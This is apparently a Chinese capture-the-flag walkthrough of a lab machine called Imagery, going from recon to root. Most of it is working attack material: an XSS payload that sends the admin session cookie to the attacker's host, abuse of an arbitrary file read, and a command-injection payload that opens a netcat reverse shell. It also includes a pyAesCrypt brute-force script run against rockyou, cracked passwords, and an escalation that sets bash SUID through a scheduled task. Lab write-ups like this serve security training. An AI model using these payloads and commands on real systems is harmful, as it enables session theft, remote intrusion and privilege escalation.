
<img width="1280" height="674" alt="Image" src="https://github.com/user-attachments/assets/e02e05ed-525c-4ba3-a29b-34ad005299a7" />

nmap -sC -sV 10.129.4.153

开放了22端口和8000端口

<img width="479" height="414" alt="Image" src="https://github.com/user-attachments/assets/af8580be-0127-4b6f-a238-e244cd3a20d3" />
扫下目录

ffuf -u http://10.129.4.153:8000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200

感觉也没啥，页面上都有

<img width="905" height="483" alt="Image" src="https://github.com/user-attachments/assets/fe4d7b7b-bd4a-4034-bc9b-68c6182e0e6d" />

有一个注册功能
<img width="661" height="381" alt="Image" src="https://github.com/user-attachments/assets/c3c2c35a-5271-4899-b29f-80ab984bb081" />

注册后登录
在网页源代码中有好几个/admin/的路径

/admin/bug_reports
/admin/delete_bug_report
/admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log
/admin/delete_user
/admin/users

<img width="861" height="356" alt="Image" src="https://github.com/user-attachments/assets/be9edd0b-8460-4633-ac85-16085bdf3b76" />

<img width="861" height="356" alt="Image" src="https://github.com/user-attachments/assets/3ff0cb6f-47a2-4646-8246-138ecb20756b" />

XSS漏洞：

存在与Report Bug页面

<img width="753" height="413" alt="Image" src="https://github.com/user-attachments/assets/df4eb309-9ff1-4600-9cbc-f77a7b591e2c" />

Payload
<img src=x onerror=\"document.location='http://10.10.16.67:8888/?cookie='+document.cookie\">

本地监听8888端口
等待cookie

<img width="666" height="239" alt="Image" src="https://github.com/user-attachments/assets/ad8b4bfa-a524-4c62-ba51-ad2f214029da" />

burp中替换刚刚获取到的cookie
访问/admin/users

<img width="615" height="419" alt="Image" src="https://github.com/user-attachments/assets/7b9b4276-ac10-4ea2-a3f1-83a40bee2867" />

利用浏览器插件
添加名称session，和刚才的cookie，就可以浏览器访问了

<img width="912" height="309" alt="Image" src="https://github.com/user-attachments/assets/7386a286-5139-40a7-8d6f-1bed59cb090a" />

/admin/get_system_log?log_identifier= 这个接口存在任意文件读取

<img width="615" height="421" alt="Image" src="https://github.com/user-attachments/assets/7632cd6e-18df-475e-a3ba-5a12f305ff0e" />

存在 root web mark 三个用户


读一下web用户下的文件

<img width="798" height="450" alt="Image" src="https://github.com/user-attachments/assets/40606137-4869-4f9f-bc14-7a91ebdc3b45" />

db.json
拿到了两个hash

<img width="686" height="428" alt="Image" src="https://github.com/user-attachments/assets/140278b3-d684-4b13-a2fa-60e771ca4d79" />

破解一下test用户
iambatman
他是蝙蝠侠

<img width="603" height="257" alt="Image" src="https://github.com/user-attachments/assets/70a42148-39c0-4cc7-be69-537a2d553e96" />

账号：testuser@imagery.htb
密码：iambatman

这个用户有一个 My Images功能 
Transform Image 图像变换存在RCE

<img width="602" height="414" alt="Image" src="https://github.com/user-attachments/assets/b73a1bcc-5ebc-4b1e-aedb-d00b3fd3082f" />

payload：在x处

"1`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.67 4444 >/tmp/f`"

<img width="848" height="417" alt="Image" src="https://github.com/user-attachments/assets/a1fc8b7f-a60b-45c4-9f3a-76f0deccafe9" />

查看计划任务

<img width="503" height="345" alt="Image" src="https://github.com/user-attachments/assets/40255b37-87d6-4094-9e2e-3194afd160de" />

查看该文件
有一个用户名和密码

<img width="414" height="422" alt="Image" src="https://github.com/user-attachments/assets/c568d8ef-4130-4d08-bb66-5db8929452e8" />

/var/backup路径下有个备份文件

<img width="603" height="146" alt="Image" src="https://github.com/user-attachments/assets/b0bcf01d-7dea-4684-9d86-eb265b30fd2c" />

打开需要密码

<img width="498" height="60" alt="Image" src="https://github.com/user-attachments/assets/0744d76a-defd-48eb-93b1-f70ee29a27d2" />


用大佬的脚本
import pyAesCrypt
import sys


def decrypt(encrypted_file, password):
    try:
        pyAesCrypt.decryptFile(
            encrypted_file,
            "web_20250806_120723.zip",
            password,
            256 * 1024
        )
        return True
    except:
        return False


# Đọc wordlist
with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
    for line in f:
        password = line.strip()
        print(f"Trying: {password}", end='\r')
        
        if decrypt('web_20250806_120723.zip.aes', password):
            print(f"\n[+] Password found: {password}")
            sys.exit(0)


print("\n[-] Password not found")

<img width="225" height="65" alt="Image" src="https://github.com/user-attachments/assets/27942696-79ad-4191-9b46-a9fefc75e016" />

pyAesCrypt -d web_20250806_120723.zip.aes -o web_20250806_120723.zip -p 'bestfriends'

然后解压

<img width="393" height="257" alt="Image" src="https://github.com/user-attachments/assets/b1897c80-91bf-4963-b65e-6c6c27a28602" />

db.json
拿到mark的hash

<img width="456" height="482" alt="Image" src="https://github.com/user-attachments/assets/80ad654e-4b32-47bd-b647-4aff374c6b3c" />

<img width="651" height="308" alt="Image" src="https://github.com/user-attachments/assets/98392ab6-9980-4806-a68d-c586adfdbe4c" />

mark ：supersmash

直接切换到mark

<img width="335" height="62" alt="Image" src="https://github.com/user-attachments/assets/fdecd0d4-4c79-461a-bf9c-2e03b158d40f" />

拿到userflag

<img width="362" height="77" alt="Image" src="https://github.com/user-attachments/assets/3c28764f-29a5-4de1-9993-6c942bdbb53c" />

<img width="362" height="77" alt="Image" src="https://github.com/user-attachments/assets/08e1d697-f8d1-4e5e-9a93-7788f6091a83" />

<img width="590" height="260" alt="Image" src="https://github.com/user-attachments/assets/fb42cf6a-f680-49c2-8447-b0154b2472ef" />

创建一个计划任务
auto add --schedule "* * * * *" --command "chmod +s /usr/bin/bash" --name "test"

<img width="650" height="114" alt="Image" src="https://github.com/user-attachments/assets/9f6c7d10-d6a3-4ac0-9d44-ee2cfa80613c" />

等待一分钟
<img width="324" height="81" alt="Image" src="https://github.com/user-attachments/assets/b41abef3-6b6f-4ca7-a04a-c47f10845d8c" />
